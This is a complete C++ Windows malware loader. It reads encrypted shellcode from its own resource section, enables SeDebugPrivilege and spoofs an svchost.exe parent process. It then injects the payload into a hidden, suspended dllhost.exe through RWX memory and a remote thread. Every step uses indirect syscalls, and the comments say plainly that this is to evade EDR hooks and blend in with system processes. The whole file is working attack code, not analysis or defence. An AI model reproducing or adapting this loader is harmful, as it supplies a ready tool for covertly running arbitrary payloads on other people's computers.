#include <windows.h>
#include <vector>
#include "resource.h"
#include "Syscalls.h"

// =============================================================
// [MACROS & DEFINITIONS]
// =============================================================

// Define NT_SUCCESS macro to check status codes
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Status code for buffer too small error in NtQuerySystemInformation
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

// Hardcoded LUID for SeDebugPrivilege (LowPart = 20)
// This avoids calling LookupPrivilegeValue, reducing API noise.
#define SE_DEBUG_PRIVILEGE 20ULL

// Base priority type definition for process structures
typedef LONG KPRIORITY;

// Structure required for NtQuerySystemInformation (SystemProcessInformation Class 5)
// Used to iterate through running processes without using the noisy CreateToolhelp32Snapshot API.
typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;            // Offset to the next entry in the buffer
    ULONG NumberOfThreads;            // Number of threads in the process
    BYTE Reserved1[48];               // Reserved fields
    UNICODE_STRING ImageName;         // The name of the process (e.g., "svchost.exe")
    KPRIORITY BasePriority;           // Base process priority
    HANDLE UniqueProcessId;           // Process ID (PID)
    PVOID Reserved2;                  // Reserved
    ULONG HandleCount;                // Count of open handles
    ULONG SessionId;                  // Session ID
    PVOID Reserved3;                  // Reserved
    SIZE_T PeakVirtualSize;           // Peak virtual memory size
    SIZE_T VirtualSize;               // Virtual memory size
    ULONG Reserved4;                  // Reserved
    SIZE_T PeakWorkingSetSize;        // Peak working set size
    SIZE_T WorkingSetSize;            // Working set size
    PVOID Reserved5;                  // Reserved
    SIZE_T QuotaPagedPoolUsage;       // Paged pool usage
    PVOID Reserved6;                  // Reserved
    SIZE_T QuotaNonPagedPoolUsage;    // Non-paged pool usage
    SIZE_T PagefileUsage;             // Pagefile usage
    SIZE_T PeakPagefileUsage;         // Peak pagefile usage
    SIZE_T PrivatePageCount;          // Private page count
    LARGE_INTEGER Reserved7[6];       // Reserved
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

// =============================================================
// [HELPER FUNCTIONS]
// =============================================================

/**
 * LoadShellcodeFromResource
 * -------------------------------------------------------------
 * Loads the encrypted/obfuscated shellcode from the compiled
 * executable's resource section (.rsrc).
 * * @param resourceID: The integer ID of the resource (defined in resource.h).
 * @param buffer: Reference to a vector to store the raw shellcode data.
 * @return: true if successful, false otherwise.
 */
bool LoadShellcodeFromResource(int resourceID, std::vector<unsigned char>& buffer) {
    // Find the resource handle in the current module. 
    // NULL as the first argument implies the current module (hInstance).
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(resourceID), RT_RCDATA);
    if (!hRes) return false;

    // Load the resource into global memory
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return false;

    // Get the size of the resource
    DWORD dataSize = SizeofResource(NULL, hRes);

    // Lock the resource to get a pointer to the data
    void* pData = LockResource(hData);
    if (dataSize == 0 || !pData) return false;

    // Resize the buffer and copy the data
    buffer.resize(dataSize);
    memcpy(buffer.data(), pData, dataSize);

    return true;
}

/**
 * EnableDebugPrivilege
 * -------------------------------------------------------------
 * Attempts to enable SeDebugPrivilege for the current process
 * using Indirect Syscalls to avoid user-mode hooks on OpenProcessToken
 * and AdjustTokenPrivileges.
 * * @return: true if successful, false otherwise.
 */
bool EnableDebugPrivilege() {
    HANDLE hToken = NULL;
    NTSTATUS status;

    // 1. Open the process token for the current process
    // NtCurrentProcess() is a pseudo-handle (-1), safe to use directly.
    status = Sw3NtOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

    if (!NT_SUCCESS(status)) return false;

    // 2. Prepare the Token Privileges structure
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid.LowPart = SE_DEBUG_PRIVILEGE; // Hardcoded LUID (20)
    tp.Privileges[0].Luid.HighPart = 0;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // 3. Adjust the token privileges via Syscall
    status = Sw3NtAdjustPrivilegesToken(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

    // Always close the handle
    Sw3NtClose(hToken);

    if (!NT_SUCCESS(status)) return false;

    return true;
}

/**
 * GetSvchostHandle
 * -------------------------------------------------------------
 * Enumerates running processes using NtQuerySystemInformation (Syscall).
 * This bypasses the noisy CreateToolhelp32Snapshot API often flagged by EDR.
 * It searches for "svchost.exe" and opens a handle to it.
 * * @param outPid: Pointer to a DWORD to store the found PID.
 * @return: Handle to the svchost process, or NULL if failed.
 */
HANDLE GetSvchostHandle(DWORD* outPid) {
    NTSTATUS status;
    PVOID buffer = NULL;
    ULONG bufferSize = 0;
    ULONG requiredSize = 0;

    // 1. Loop until we allocate a buffer large enough for process info
    // NtQuerySystemInformation can return STATUS_INFO_LENGTH_MISMATCH if the buffer is too small.
    do {
        // Free previous buffer if it was too small
        if (buffer) {
            HeapFree(GetProcessHeap(), 0, buffer);
            buffer = NULL;
        }

        // Initial size guess (1MB)
        if (requiredSize == 0) requiredSize = 1024 * 1024;
        bufferSize = requiredSize;

        // Allocate memory from the heap
        buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);
        if (!buffer) return NULL;

        // Call NtQuerySystemInformation (SystemProcessInformation = 5)
        status = Sw3NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &requiredSize);

    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status)) {
        if (buffer) HeapFree(GetProcessHeap(), 0, buffer);
        return NULL;
    }

    // 2. Iterate through the process list
    PSYSTEM_PROCESS_INFORMATION pSpi = (PSYSTEM_PROCESS_INFORMATION)buffer;
    HANDLE hProcess = NULL;

    while (true) {
        // Check if ImageName is valid and matches "svchost.exe" (case-insensitive check)
        if (pSpi->ImageName.Buffer && _wcsicmp(pSpi->ImageName.Buffer, L"svchost.exe") == 0) {

            // Setup Object Attributes
            OBJECT_ATTRIBUTES oa;
            InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

            // Setup Client ID (Target PID)
            CLIENT_ID cid;
            cid.UniqueProcess = pSpi->UniqueProcessId;
            cid.UniqueThread = NULL;

            // Open the process via Syscall 
            // PROCESS_CREATE_PROCESS access is required for PPID spoofing.
            NTSTATUS openStatus = Sw3NtOpenProcess(&hProcess, PROCESS_CREATE_PROCESS, &oa, &cid);

            if (NT_SUCCESS(openStatus)) {
                *outPid = (DWORD)(ULONG_PTR)pSpi->UniqueProcessId;
                break; // Target found and opened successfully
            }
        }

        // Move to the next entry in the linked list
        if (pSpi->NextEntryOffset == 0) break;
        pSpi = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)pSpi + pSpi->NextEntryOffset);
    }

    // Clean up allocated memory
    HeapFree(GetProcessHeap(), 0, buffer);
    return hProcess;
}

// =============================================================
// [ENTRY POINT]
// =============================================================

// WinMain is used instead of main() to prevent a console window from spawning.
// SAL annotations (_In_, _In_opt_) are included to satisfy compiler warnings.
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {

    // 1. Load Shellcode
    // ------------------------------------
    std::vector<unsigned char> payload_shellcode;
    if (!LoadShellcodeFromResource(IDR_RCDATA1, payload_shellcode)) {
        return 1; // Silent failure if resource is missing or corrupted
    }

    // 2. Privilege Escalation
    // ------------------------------------
    // Attempt to get SeDebugPrivilege via Syscalls. 
    // We continue execution even if this fails, as it might not be strictly necessary depending on the user context.
    EnableDebugPrivilege();

    // 3. Parent Process Identification (PPID Spoofing Prep)
    // ------------------------------------
    DWORD parentPid = 0;
    HANDLE hParentProcess = GetSvchostHandle(&parentPid);
    if (!hParentProcess) {
        return 1; // Cannot find a valid parent, aborting execution.
    }

    // 4. Process Creation with Spoofed PPID
    // ------------------------------------
    STARTUPINFOEXA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeSize = 0;

    // Allocate space for the attribute list
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);

    // Update the attribute list to specify the spoofed parent process
    if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        return 1;
    }

    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE; // Ensure the target runs hidden

    // Target executable to spawn (Sacrificial Process)
    // dllhost.exe is a common system process, blending in well.
    char targetCmdLine[] = "C:\\Windows\\System32\\dllhost.exe";

    // Create the process in a SUSPENDED state
    // This allows us to inject code before the process actually starts running.
    if (!CreateProcessA(NULL, targetCmdLine, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL, &si.StartupInfo, &pi)) {
        return 1;
    }

    // 5. Injection Sequence (Indirect Syscalls)
    // ------------------------------------
    NTSTATUS status;
    PVOID remoteMem = NULL;
    SIZE_T regionSize = payload_shellcode.size();

    // A. Allocate Memory (RWX)
    // Using Indirect Syscalls to allocate memory in the remote process.
    status = Sw3NtAllocateVirtualMemory(pi.hProcess, &remoteMem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) {
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    // B. Write Payload
    // Writing the shellcode into the allocated memory.
    SIZE_T bytesWritten = 0;
    status = Sw3NtWriteVirtualMemory(pi.hProcess, remoteMem, payload_shellcode.data(), payload_shellcode.size(), &bytesWritten);
    if (!NT_SUCCESS(status)) {
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    // C. Execute Payload (Create Remote Thread)
    // Starting a new thread in the remote process to execute the shellcode.
    HANDLE hThread = NULL;
    status = Sw3NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        pi.hProcess,
        remoteMem,
        NULL,
        FALSE,
        0, 0, 0, NULL
    );

    if (NT_SUCCESS(status)) {
        // Close the thread handle immediately after creation to clean up.
        // The thread continues to run.
        Sw3NtClose(hThread);
    }
    else {
        // If execution fails, kill the sacrificial process to avoid leaving a zombie process.
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    // 6. Cleanup
    // ------------------------------------
    // Close handles to the spoofed parent and the sacrificial process.
    Sw3NtClose(hParentProcess);
    Sw3NtClose(pi.hProcess);
    Sw3NtClose(pi.hThread); // Primary thread of the suspended process (not the injected one)

    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

    return 0;
}